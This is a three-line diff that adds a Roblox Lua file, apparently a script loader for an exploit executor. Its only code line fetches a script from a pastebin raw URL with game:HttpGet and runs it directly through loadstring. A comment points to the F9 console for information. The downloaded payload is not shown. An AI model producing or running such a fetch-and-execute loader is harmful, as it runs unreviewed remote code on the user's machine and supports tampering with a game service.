@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/tpmsPtLc", true))()
+
+--press f9 for info
